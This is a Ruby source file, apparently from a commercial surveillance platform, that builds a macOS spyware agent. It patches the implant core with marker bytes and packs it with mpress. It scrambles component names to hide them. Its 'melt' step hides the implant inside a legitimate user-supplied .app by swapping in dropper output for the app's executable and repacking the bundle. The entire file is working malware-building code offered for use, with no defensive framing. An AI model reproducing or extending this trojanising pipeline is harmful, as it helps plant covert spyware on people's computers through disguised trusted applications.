#
#  Agent creation for osx
#

# from RCS::Common
require 'rcs-common/trace'

require 'plist'

module RCS
module DB

class BuildOSX < Build

  def initialize
    super
    @platform = 'osx'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :osx, params['demo']

    # remember the demo parameter
    @demo = params['demo']

    # invoke the generic patch method with the new params
    super

    patch_file(:file => params[:core]) do |content|
      begin
        method = params['admin'] ? 'Ah57K' : 'Ah56K'
        method += SecureRandom.random_bytes(27)
        content.binary_patch 'iuherEoR93457dFADfasDjfNkA7Txmkl', method
      rescue
        raise "Working method marker not found"
      end
    end
    
    CrossPlatform.exec path('mpress'), "-ub " + path(params[:core])

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7)
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    inputmanager = scramble_name(config, 2)
    #driver = scramble_name(config, 4)
    #driver64 = scramble_name(config, 16)
        
    @scrambled = {core: core, dir: dir, config: config, inputmanager: inputmanager}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    executable = path('default')
    @appname = params['appname'] || 'install'

    # the user has provided a file to melt with
    if params and params['input']
      FileUtils.mv Config.instance.temp(params['input']), path('input')

      exe = ''
      trace :debug, "Build: melting: searching for the executable into app..."
      # unzip the application and extract the executable file
      Zip::File.open(path('input')) do |z|
        z.each do |f|
          if f.name['.app/Contents/Info.plist']
            xml = z.file.open(f.name) {|x| x.read}
            exe = Plist::parse_xml(xml.force_encoding('UTF-8'))['CFBundleExecutable']
            raise "cannot find CFBundleExecutable" if exe.nil?
            trace :debug, "Build: melting: executable provided into app is [#{exe}]"
          end
        end

        raise "executable not found in the provided app" if exe == ''

        # rescan to search for the exe and extract it
        z.each do |f|
          if f.name =~ /\.app\/Contents\/MacOS\/#{exe}$/
            z.extract(f, path('exe'))
            executable = path('exe')
            @appname = f.name
          end
        end
      end
    end

    CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                        path(@scrambled[:config])+' '+
                                        path(@scrambled[:inputmanager])+' '+
                                        @scrambled[:dir]+' '+
                                        (@demo ? path('demo_image') : 'null') +' '+
                                        executable + ' ' +
                                        path('output')

    File.exist? path('output') || raise("output file not created by dropper")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    # substitute the exec into the app
    if File.exist? path('input')
      trace :debug, "Build: pack: repacking the app with [#{@appname}]"

      Zip::File.open(path('input')) do |z|
        z.file.open(@appname, 'wb') {|f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
        z.file.chmod(0755, @appname)
      end

      FileUtils.mv(path('input'), path('output.zip'))

      # this is the only file we need to output after this point
      @outputs = ['output.zip']

      return
    end

    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
    end

    # make it executable (for some reason we cannot do it in the previous phase)
    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      z.file.chmod(0755, @appname)
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::File.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
    FileUtils.rm_rf Config.instance.temp('core')
  end

end

end #DB::
end #RCS::
